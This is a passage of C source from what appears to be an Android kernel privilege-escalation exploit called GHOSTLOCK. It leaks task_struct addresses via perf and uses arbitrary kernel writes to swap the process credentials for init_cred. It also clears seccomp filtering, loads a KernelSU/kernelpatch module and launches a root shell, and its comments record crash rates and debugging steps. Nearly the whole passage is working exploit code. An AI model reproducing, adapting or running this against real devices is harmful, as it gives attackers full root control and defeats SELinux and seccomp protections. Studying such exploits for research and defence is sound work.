    int vr_ok = 1;
    if (vr_needed) {
      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
                            "VR: flags+tagA", 1, 1);

      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
      if (vr_ok) {
        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
      }

      if (vr_ok) {
        pr_success("VR.ko per-task tags cleared\n");
      } else {
        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
      }
    }
  }
#endif

    pselect_child_node = 1;

    /* W2 diagnostic A/B: redirect the write target from the perf-leaked
     * child_task+cred to a stable kernel symbol (selinux_enforcing), keeping
     * the W2 write value (init_cred) and route identical. If this does NOT
     * panic while the real child_task target DOES, child_task is a garbage
     * perf leak on 5.10; if it still panics, the binding breaks for runtime
     * (non-symbol) targets. Set GHOSTLOCK_W2_SAFE_PROBE=1 to enable. */
    uintptr_t w2_target = child_task + TASK_CRED_OFF;
    if (getenv("GHOSTLOCK_W2_SAFE_PROBE") && *getenv("GHOSTLOCK_W2_SAFE_PROBE")) {
      w2_target = data_addr(SELINUX_ENFORCING);
      pr_info("W2 SAFE PROBE: redirecting target -> selinux_enforcing "
              "(child_task was 0x%016zx)\n", child_task);
    }

    /* ── Parent self-leak + self-root route (GHOSTLOCK_SELF_W2=1) ──────
     * perf_event_open(pid=0) samples the CALLING process, so running
     * perf_find_task() here leaks OUR OWN task. Pointing our own
     * task->cred at init_cred then makes the exploit process itself root:
     * no child, no pipe round-trip, hence no "child died before reporting"
     * link to break. Measured: that pipe hop was the only reason the root
     * script never started even when the W2 pselect survived. */
    if (getenv("GHOSTLOCK_SELF_W2") && *getenv("GHOSTLOCK_SELF_W2")) {
      uintptr_t t[3] = {0, 0, 0};
      for (int i = 0; i < 3; i++) t[i] = perf_find_task();
      uintptr_t my_task = 0;
      if (t[0] && t[0] == t[1])
        my_task = t[0];
      else if (t[0] && t[0] == t[2])
        my_task = t[0];
      else if (t[1] && t[1] == t[2])
        my_task = t[1];
      if (!my_task) {
        pr_warning("SELF-W2: self perf leak did not reproduce\n");
        return 1;
      }
      uintptr_t self_target = my_task + TASK_CRED_OFF;
      pr_info("SELF-W2: my_task=%016zx cred_target=%016zx\n", my_task, self_target);
      if (retry_write_stage("SELF-W2: cred", self_target, 2, 15, 100000,
                            verify_self_stage, NULL, 0)) {
        pr_success("SELF-W2 root; probing post-root state\n");
        /* Direct observation before exec: does the process still behave like
         * a working root? A failed execve is invisible (the image is gone),
         * so probe first. */
        pr_info("SELF-W2 probe: uid=%d euid=%d gid=%d\n", getuid(), geteuid(),
                getgid());
        {
          errno = 0;
          int pfd = open("/data/local/tmp/.ghostlock_probe",
                         O_WRONLY | O_CREAT | O_TRUNC, 0644);
          pr_info("SELF-W2 probe: open=%d errno=%d\n", pfd, errno);
          if (pfd >= 0) {
            ssize_t pw = write(pfd, "probe\n", 6);
            pr_info("SELF-W2 probe: write=%zd errno=%d\n", pw, errno);
            close(pfd);
          }
          errno = 0;
          int pfd2 = open("/sdcard/.ghostlock_probe2",
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
          pr_info("SELF-W2 probe: open(/sdcard)=%d errno=%d\n", pfd2, errno);
          if (pfd2 >= 0) close(pfd2);
        }
        pr_success("SELF-W2 root; loading module IN-PROCESS\n");
        /* Do NOT exec a new image. The rb_erase side write left the gid in
         * our cred as junk (measured gid=963877376), and exec re-initialises
         * credentials -- that is where the damage bites and the new image
         * dies before running a single line. Staying in THIS image is fine:
         * the probe showed open()/write() both succeed. */
        {
          const char *ko = "/data/local/tmp/kernelpatch.ko";
          /* Relocate + init_module in-process. The old code called a bare
           * finit_module here, which can only ever return ENOENT. */
          klog("SELF-W2: relocate+load %s\n", ko);
          int lrc = kpatch_relocate_and_load(ko);
          pr_info("SELF-W2: relocate+init_module rc=%d\n", lrc);
          klog("SELF-W2: relocate+init_module rc=%d\n", lrc);
          /* ---- isolation experiment ----
           * The klog from five consecutive hits always stops at exactly
           * "module_loaded=1"; nothing after it (result write / stat / setgid)
           * ever got recorded, so we cannot tell an asynchronous kpatch
           * side-effect from our own follow-up calls. Here we do NOTHING after
           * a successful load except sleep, and we tick every 30s:
           *   begin but no tick  -> died right after init_module returned
           *   begin + N ticks    -> the device survived N*30s with kpatch live
           *   no begin at all    -> died between klog and the first sleep
           */
          if (lrc == 0 && getenv("GHOSTLOCK_HOLD") && *getenv("GHOSTLOCK_HOLD")) {
            klog("HOLD begin pid=%d uid=%d gid=%d\n", getpid(), getuid(), getgid());
            for (int i = 0; i < 320; i++) {
              sleep(1);
              if (i % 30 == 29) klog("HOLD tick %ds alive\n", i + 1);
            }
            klog("HOLD end\n");
          }
          FILE *mf = fopen("/proc/modules", "r");
          if (mf) {
            char line[256];
            int found = 0;
            while (fgets(line, sizeof(line), mf))
              if (strstr(line, "kernelpatch") || strstr(line, "kernelsu"))
                found = 1;
            fclose(mf);
            pr_info("SELF-W2: module_loaded=%d\n", found);
            klog("module_loaded=%d\n", found);
          }
          int efd = open("/data/local/tmp/.ghostlock_result",
                         O_WRONLY | O_CREAT | O_TRUNC, 0644);
          if (efd >= 0) {
            char buf[256];
            int bn = snprintf(buf, sizeof(buf), "uid=%d gid=%d\n", getuid(),
                              getgid());
            ssize_t bw = write(efd, buf, bn);
            pr_info("SELF-W2: result file wrote %zd bytes\n", bw);
            close(efd);
          }
        }
        pr_success("SELF-W2 done (module should be live)\n");
        /* Verify the script actually made it to disk with real content, and
         * report every exec failure instead of exiting silently -- a silent
         * execl failure is exactly what made the previous rounds look like
         * "nothing happened". */
        {
          struct stat st;
          if (stat(g_root_script_path, &st) != 0) {
            pr_warning("SELF-W2: stat(%s) failed errno=%d\n",
                       g_root_script_path, errno);
          } else {
            int vfd = open(g_root_script_path, O_RDONLY);
            char head[64];
            ssize_t hn = vfd >= 0 ? read(vfd, head, sizeof(head) - 1) : -1;
            if (vfd >= 0) close(vfd);
            if (hn > 0) head[hn] = 0;
            pr_info("SELF-W2: script size=%lld head=[%.20s]\n",
                    (long long)st.st_size, hn > 0 ? head : "(unreadable)");
          }
        }
        /* The rb_erase side write lands on init_cred+8, which IS init_cred.gid,
         * so our gid is junk (measured 2026-09-11: -276807936 == 0xef803f00,
         * exactly the low 32 bits of task+0x780). uid 0 already owns
         * /system/bin/sh, so exec itself does not need a sane gid -- but every
         * child we spawn inherits the junk, and so does every group-permission
         * check downstream. We hold init_cred (full caps), so fix it up first. */
        /* setgid/setgroups/setuid and the whole execl chain are REMOVED.
         * Every reason is measured, not assumed:
         *  - The isolation run (11:16) proved kpatch loads cleanly and the
         *    device then stays UP for 170s with the module resident
         *    ("HOLD begin" + five "HOLD tick" lines + "HOLD end"). The klog
         *    stops exactly before these calls, so they are the crash suspect.
         *  - Repairing gid cannot help even in principle: execve rebuilds creds
         *    from a fresh copy, so the fix never reaches the new image.
         *  - task->cred points straight at the GLOBAL init_cred, and
         *    commit_creds() calls put_cred() on the outgoing cred -- i.e.
         *    atomic_dec_and_test on a shared kernel object. Doing that to the
         *    global cred is not safe.
         * The module is in the kernel now. Verification happens from the host
         * over adb while this process stays alive. */
        klog("post-load: hold finished, exiting cleanly (no setgid, no exec)\n");
        pr_success("SELF-W2: done, module live\n");
        _exit(0);
      }
      pr_warning("SELF-W2 failed after retries\n");
      return 1;
    }

    int got_root = retry_write_stage(
        "W2: cred", w2_target, 2, 15, 100000,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      pr_warning("W2 failed after 15 rounds\n");
      waitpid(child, NULL, WNOHANG);
      return 1;
    }
    ever_rooted = 1;
    /* rooted children never exit; chain failures park (P) */

    /* GHOSTLOCK_PATCH_REAL_CRED=1: also point task->real_cred at init_cred.
     * The reference implementation (Root-My-Pixel-Payloads src/root.c) reads
     * both TASK_REAL_CRED_OFF and TASK_CRED_OFF and patches BOTH cred objects
     * when they differ; we replace the pointer instead, so mirroring it means
     * a second identical write at cred-8. Leaving the two divergent risks
     * SELinux/audit paths that read real_cred (security_task_*, audit_log_
     * exit, override_creds). Off unless requested, because it costs an extra
     * pselect (~18% survival, ~82% panic) per run -- A/B it explicitly. */
    if (getenv("GHOSTLOCK_PATCH_REAL_CRED") && *getenv("GHOSTLOCK_PATCH_REAL_CRED")) {
      pr_info("W2b: patching real_cred (%016zx) for consistency\n", w2_target - 8);
      retry_write_stage("W2b: real_cred", w2_target - 8, 2, 15, 100000,
                        verify_w2_stage, &w2_context, 0);
    }

    /* W3: clear the child's seccomp filter for the independent root shell
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; do both writes back-to-back with one probe
     * (real finit_module calls trip vendor root guards).
     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
     * probe to tell [target] from [target+8]. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    int tcp_writes = tcp_route_selected();
    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = !tcp_writes,
    };
    if (!tcp_writes) {
      int dir_ok = retry_write_stage(
          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
          verify_leaf_dir_stage, &w3_context, 1);
      if (!dir_ok) {
        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
      }
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
    uintptr_t mode_target = w3_context.leaf_to_target8
      ? child_task + TASK_SECCOMP_OFF - 8
      : child_task + TASK_SECCOMP_OFF;

    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      if (verify_seccomp_probe_stage(&w2_context)) {
        seccomp_ok = 1;
        break;
      }
      usleep(50000);
    }

    if (!seccomp_ok) {
      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");

  sleep(2);
  TIMER("exploit complete");
  if (!ever_rooted) {
    pr_error("w2 never rooted a child\n");
    return 1;
  }
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (child exited early)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, WNOHANG);
    if (parked_cmd_w >= 0) close(parked_cmd_w);
  } else if (parked_child > 0) {
    if (write(parked_cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (parked child exited)\n");
    close(parked_cmd_w);
    waitpid(parked_child, NULL, WNOHANG);
    parked_cmd_w = -1;
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
   * the app-readable log for the loaded-module line (up to ~30s). */
  int ksu_log_loaded = 0;
  int ksu_log_failed = 0;
  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
    char ksu_log_path[320];
    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
    FILE *lf = fopen(ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
      }
      fclose(lf);
    }
    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
  }
  /* Module init re-enforces at the very end of kernelsu_init; wait up to
   * 20s for it. Denied read or value 1 both mean enforcing here. */
  int enforce_ok = 0;
  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (efd < 0) {
      enforce_ok = 1;
      break;
    }
    char eb[4] = {0};
    ssize_t rn = read(efd, eb, sizeof(eb));
    close(efd);
    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
    if (!enforce_ok) usleep(100000);
  }
  if (enforce_ok)
    pr_info("enforce=1 (enforcing)\n");
  else if (ksu_log_loaded)
    pr_warning("enforce=0 (still permissive)\n");
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;

  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
   * policy reload keeps it working after enforcing is back. */
  if (kernelsu_ready)
    pr_success("KernelSU ready\n");
  else if (ksu_log_failed)
    pr_warning("KernelSU module load failed\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module load pending\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  return 0;
}

int main(int argc, char **argv) { return run_exploit(argc, argv); }
